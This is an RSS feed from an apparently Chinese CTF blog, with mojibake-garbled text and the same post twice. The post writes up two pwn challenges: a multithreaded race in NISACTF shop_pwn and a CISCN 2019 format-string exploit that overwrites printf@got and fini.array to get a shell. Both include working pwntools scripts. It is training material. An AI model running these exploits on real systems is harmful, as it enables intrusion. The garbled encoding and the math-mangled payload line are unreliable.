<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title> â€¢ Posts by &#34;gotè¡¨&#34; tag</title>
        <link>http://example.com</link>
        <description>æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸</description>
        <language>zh-CN</language>
        <pubDate>Fri, 22 Sep 2023 20:04:31 +0800</pubDate>
        <lastBuildDate>Fri, 22 Sep 2023 20:04:31 +0800</lastBuildDate>
        <category>wp</category>
        <category>é¶æœºæ¸—é€</category>
        <category>vulnHUB</category>
        <category>canary</category>
        <category>å †</category>
        <category>pie</category>
        <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</category>
        <category>csu</category>
        <category>rop</category>
        <category>gdb</category>
        <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²</category>
        <category>gotè¡¨</category>
        <category>unlink</category>
        <category>uaf</category>
        <category>srop</category>
        <category>gotæ”¹å†™</category>
        <category>éšæœºæ•°æ£€æŸ¥</category>
        <item>
            <guid isPermalink="true">http://example.com/2023/09/22/new-pwn/</guid>
            <title>new_pwn</title>
            <link>http://example.com/2023/09/22/new-pwn/</link>
            <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²</category>
            <category>gotè¡¨</category>
            <pubDate>Fri, 22 Sep 2023 20:04:31 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;è®°å½•ä¸¤é“pwné¢˜&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è®°å½•ä¸¤é“pwné¢˜&#34;&gt;#&lt;/a&gt; è®°å½•ä¸¤é“ PWN é¢˜&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ç»™æ–°ç”Ÿå‡ºé¢˜ï¼Œå‡ºç´¯äº†ï¼Œéšä¾¿çœ‹äº†ä¸¤ä¸ª PWN é¢˜ï¼Œå‘ç°è¿™ä¸¤ä¸ª PWN éƒ½å€¼å¾—è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ONE&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nisactf-2022shop_pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nisactf-2022shop_pwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]shop_pwn&lt;/h2&gt;
&lt;p&gt;é¢˜ç›®æ ‡ç­¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180317483.png&#34; alt=&#34;20230922180317483&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pthread_create å¤šçº¿ç¨‹ç«äº‰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180537307.png&#34; alt=&#34;20230922180537307&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰§è¡Œç¨‹åºå¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180732045.png&#34; alt=&#34;20230922180732045&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ”¾å…¥ IDA çœ‹ä¸€ä¸‹å…·ä½“çš„å‡½æ•°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180849649.png&#34; alt=&#34;20230922180849649&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çœ‹ä¸€ä¸‹ä¸»è¦çš„å‡½æ•°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181202034.png&#34; alt=&#34;20230922181202034&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181325444.png&#34; alt=&#34;20230922181325444&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è„šæœ¬å¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œåˆ©ç”¨äº† pthread_create åˆ›å»ºè¿›ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æŒ‡ä»¤å‘é€å¾—å¿«çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ç¬¬ä¸€æ¬¡å”®å–åŠŸèƒ½æ‰§è¡Œçš„æ—¶å€™æ­£åœ¨ unsleepï¼Œæ¥ç€æ‰§è¡Œç¬¬äºŒæ¬¡å”®å–åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±èƒ½å–å‡ºä¸¤æ¬¡å¾—åˆ°å¯ä»¥è´­ä¹° flag çš„é‡‘é’±äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;pwntool çš„ sendline å‘é€æŒ‡ä»¤å¾ˆå¿«&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
r = remote(&#39;node5.anna.nssctf.cn&#39;,28929)
r.sendline(&amp;quot;3&amp;quot;) 
r.sendline(&amp;quot;0&amp;quot;) 

r.sendline(&amp;quot;3&amp;quot;)
r.sendline(&amp;quot;0&amp;quot;)  

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ç»“æœå¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181643187.png&#34; alt=&#34;20230922181643187&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;two&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ciscn-2019è¥¿å—pwn1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn-2019è¥¿å—pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 è¥¿å—] PWN1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ &lt;code&gt;RELRO&lt;/code&gt;  ä¿æŠ¤ä¸º &lt;code&gt;NO RELRO&lt;/code&gt;  çš„æ—¶å€™ï¼Œ &lt;code&gt;init.arrayã€fini.arrayã€got.plt&lt;/code&gt;  å‡å¯è¯»å¯å†™ï¼›ä¸º &lt;code&gt;PARTIAL RELRO&lt;/code&gt;  çš„æ—¶å€™ï¼Œ &lt;code&gt;ini.arrayã€fini.array&lt;/code&gt;  å¯è¯»ä¸å¯å†™ï¼Œ &lt;code&gt;got.plt&lt;/code&gt;  å¯è¯»å¯å†™ï¼›ä¸º &lt;code&gt;FULL RELRO&lt;/code&gt;  æ—¶ï¼Œ &lt;code&gt;init.arrayã€fini.arrayã€got.plt&lt;/code&gt;  å‡å¯è¯»ä¸å¯å†™ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ &lt;code&gt;init.array&lt;/code&gt;  æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ &lt;code&gt;fini.array&lt;/code&gt;  ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™ &lt;code&gt;fini.array&lt;/code&gt;  ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º &lt;code&gt;main&lt;/code&gt;  å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ &lt;code&gt;main&lt;/code&gt;  å‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º &lt;code&gt;1&lt;/code&gt; ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922182614061.png&#34; alt=&#34;20230922182614061&#34;&gt;&lt;/p&gt;
&lt;p&gt;32 ä½ç¨‹åºä¿®æ”¹ got è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰§è¡Œç¨‹åºå‚çœ‹åç§»ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922183714065.png&#34; alt=&#34;20230922183714065&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çœ‹ä¸€ä¸‹ IDA:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184018564.png&#34; alt=&#34;20230922184018564&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184142420.png&#34; alt=&#34;20230922184142420&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨æ€è·¯ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ printf_gotï¼Œä¿®æ”¹ä¸º systemã€‚ä½†æ˜¯ç¨‹åºåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¿®æ”¹å®Œåï¼Œç¨‹åºä¼šé€€å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å¦‚æœå¦‚ä¸‹å›¾æ‰€ç¤º&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184525768.png&#34; alt=&#34;20230922184525768&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å°±å¯ä»¥å»ä¿®æ”¹ &lt;code&gt;fini.array&lt;/code&gt; , å°†å…¶å‚æ•° 1ï¼Œç»™è¦†å†™æˆ mainï¼Œé‚£ä¹ˆç¨‹åºåœ¨é€€å‡ºåå°±ä¼šå†æ¬¡æ‰§è¡Œ main å‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payloadï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;payload = b&amp;quot;%2052c%13&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;hn%31692c%14&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é€šè¿‡ gdb å»çœ‹ä¸€çœ¼ payload è¿›å…¥ç¨‹åºçš„æƒ…å†µï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922185014496.png&#34; alt=&#34;20230922185014496&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“è¯»å…¥ pyload æ—¶çš„æƒ…å†µ&lt;/p&gt;
&lt;p&gt;è¿™æ—¶ç¨‹åºè¯»å…¥ payloadã€‚ç°åœ¨ got è¡¨é¡¹æŒ‡å‘çš„è¿˜æ˜¯ printf_pltã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922191625014.png&#34; alt=&#34;20230922191625014&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“æ‰§è¡Œåˆ° printf å‡½æ•°æ—¶ï¼Œprintf_got ä¿®æ”¹ä¸º system  fini_array çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ä¸º main&lt;/p&gt;
&lt;p&gt;å½“æˆ‘ä»¬ç¨‹åºç»“æŸæ—¶ï¼Œå°±ä¼šå†æ¬¡è·³è½¬åˆ° main å‡½æ•°å…¥å£ï¼Œåœ¨è¯»å…¥ /bin/shï¼Œæ¥ç€ä¼šåœ¨è°ƒç”¨ printf å‡½æ•°ï¼Œä¼šæ‰§è¡Œ system (/bin/sh)ï¼Œä»è€Œè·å– shell&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp å¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
r = remote(&#39;node5.anna.nssctf.cn&#39;,28467)
# r = gdb.debug(&amp;quot;./XNPWN1&amp;quot;)
# å¾€fini.array[0]å†™main@text, printf@gotå†™system@plt
payload = b&amp;quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
r.recvline()

r.sendline(payload)

r.sendline(&amp;quot;/bin/sh&amp;quot;)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/09/22/picture/new-pwn/</guid>
            <title>new_pwn</title>
            <link>http://example.com/2023/09/22/picture/new-pwn/</link>
            <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²</category>
            <category>gotè¡¨</category>
            <pubDate>Fri, 22 Sep 2023 19:51:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;è®°å½•ä¸¤é“pwné¢˜&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è®°å½•ä¸¤é“pwné¢˜&#34;&gt;#&lt;/a&gt; è®°å½•ä¸¤é“ PWN é¢˜&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ç»™æ–°ç”Ÿå‡ºé¢˜ï¼Œå‡ºç´¯äº†ï¼Œéšä¾¿çœ‹äº†ä¸¤ä¸ª PWN é¢˜ï¼Œå‘ç°è¿™ä¸¤ä¸ª PWN éƒ½å€¼å¾—è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ONE&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nisactf-2022shop_pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nisactf-2022shop_pwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]shop_pwn&lt;/h2&gt;
&lt;p&gt;é¢˜ç›®æ ‡ç­¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180317483.png&#34; alt=&#34;20230922180317483&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pthread_create å¤šçº¿ç¨‹ç«äº‰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180537307.png&#34; alt=&#34;20230922180537307&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰§è¡Œç¨‹åºå¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180732045.png&#34; alt=&#34;20230922180732045&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ”¾å…¥ IDA çœ‹ä¸€ä¸‹å…·ä½“çš„å‡½æ•°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922180849649.png&#34; alt=&#34;20230922180849649&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çœ‹ä¸€ä¸‹ä¸»è¦çš„å‡½æ•°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181202034.png&#34; alt=&#34;20230922181202034&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181325444.png&#34; alt=&#34;20230922181325444&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è„šæœ¬å¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œåˆ©ç”¨äº† pthread_create åˆ›å»ºè¿›ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æŒ‡ä»¤å‘é€å¾—å¿«çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ç¬¬ä¸€æ¬¡å”®å–åŠŸèƒ½æ‰§è¡Œçš„æ—¶å€™æ­£åœ¨ unsleepï¼Œæ¥ç€æ‰§è¡Œç¬¬äºŒæ¬¡å”®å–åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±èƒ½å–å‡ºä¸¤æ¬¡å¾—åˆ°å¯ä»¥è´­ä¹° flag çš„é‡‘é’±äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;pwntool çš„ sendline å‘é€æŒ‡ä»¤å¾ˆå¿«&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
r = remote(&#39;node5.anna.nssctf.cn&#39;,28929)
r.sendline(&amp;quot;3&amp;quot;) 
r.sendline(&amp;quot;0&amp;quot;) 

r.sendline(&amp;quot;3&amp;quot;)
r.sendline(&amp;quot;0&amp;quot;)  

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ç»“æœå¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922181643187.png&#34; alt=&#34;20230922181643187&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;two&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ciscn-2019è¥¿å—pwn1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn-2019è¥¿å—pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 è¥¿å—] PWN1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ &lt;code&gt;RELRO&lt;/code&gt;  ä¿æŠ¤ä¸º &lt;code&gt;NO RELRO&lt;/code&gt;  çš„æ—¶å€™ï¼Œ &lt;code&gt;init.arrayã€fini.arrayã€got.plt&lt;/code&gt;  å‡å¯è¯»å¯å†™ï¼›ä¸º &lt;code&gt;PARTIAL RELRO&lt;/code&gt;  çš„æ—¶å€™ï¼Œ &lt;code&gt;ini.arrayã€fini.array&lt;/code&gt;  å¯è¯»ä¸å¯å†™ï¼Œ &lt;code&gt;got.plt&lt;/code&gt;  å¯è¯»å¯å†™ï¼›ä¸º &lt;code&gt;FULL RELRO&lt;/code&gt;  æ—¶ï¼Œ &lt;code&gt;init.arrayã€fini.arrayã€got.plt&lt;/code&gt;  å‡å¯è¯»ä¸å¯å†™ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ &lt;code&gt;init.array&lt;/code&gt;  æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ &lt;code&gt;fini.array&lt;/code&gt;  ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™ &lt;code&gt;fini.array&lt;/code&gt;  ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º &lt;code&gt;main&lt;/code&gt;  å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ &lt;code&gt;main&lt;/code&gt;  å‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º &lt;code&gt;1&lt;/code&gt; ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922182614061.png&#34; alt=&#34;20230922182614061&#34;&gt;&lt;/p&gt;
&lt;p&gt;32 ä½ç¨‹åºä¿®æ”¹ got è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰§è¡Œç¨‹åºå‚çœ‹åç§»ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922183714065.png&#34; alt=&#34;20230922183714065&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çœ‹ä¸€ä¸‹ IDA:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184018564.png&#34; alt=&#34;20230922184018564&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184142420.png&#34; alt=&#34;20230922184142420&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨æ€è·¯ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ printf_gotï¼Œä¿®æ”¹ä¸º systemã€‚ä½†æ˜¯ç¨‹åºåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¿®æ”¹å®Œåï¼Œç¨‹åºä¼šé€€å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å¦‚æœå¦‚ä¸‹å›¾æ‰€ç¤º&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922184525768.png&#34; alt=&#34;20230922184525768&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å°±å¯ä»¥å»ä¿®æ”¹ &lt;code&gt;fini.array&lt;/code&gt; , å°†å…¶å‚æ•° 1ï¼Œç»™è¦†å†™æˆ mainï¼Œé‚£ä¹ˆç¨‹åºåœ¨é€€å‡ºåå°±ä¼šå†æ¬¡æ‰§è¡Œ main å‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payloadï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;payload = b&amp;quot;%2052c%13&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;hn%31692c%14&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é€šè¿‡ gdb å»çœ‹ä¸€çœ¼ payload è¿›å…¥ç¨‹åºçš„æƒ…å†µï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922185014496.png&#34; alt=&#34;20230922185014496&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“è¯»å…¥ pyload æ—¶çš„æƒ…å†µ&lt;/p&gt;
&lt;p&gt;è¿™æ—¶ç¨‹åºè¯»å…¥ payloadã€‚ç°åœ¨ got è¡¨é¡¹æŒ‡å‘çš„è¿˜æ˜¯ printf_pltã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/pwnlianxi/20230922191625014.png&#34; alt=&#34;20230922191625014&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“æ‰§è¡Œåˆ° printf å‡½æ•°æ—¶ï¼Œprintf_got ä¿®æ”¹ä¸º system  fini_array çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ä¸º main&lt;/p&gt;
&lt;p&gt;å½“æˆ‘ä»¬ç¨‹åºç»“æŸæ—¶ï¼Œå°±ä¼šå†æ¬¡è·³è½¬åˆ° main å‡½æ•°å…¥å£ï¼Œåœ¨è¯»å…¥ /bin/shï¼Œæ¥ç€ä¼šåœ¨è°ƒç”¨ printf å‡½æ•°ï¼Œä¼šæ‰§è¡Œ system (/bin/sh)ï¼Œä»è€Œè·å– shell&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp å¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
r = remote(&#39;node5.anna.nssctf.cn&#39;,28467)
# r = gdb.debug(&amp;quot;./XNPWN1&amp;quot;)
# å¾€fini.array[0]å†™main@text, printf@gotå†™system@plt
payload = b&amp;quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&amp;quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
r.recvline()

r.sendline(payload)

r.sendline(&amp;quot;/bin/sh&amp;quot;)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
    </channel>
</rss>
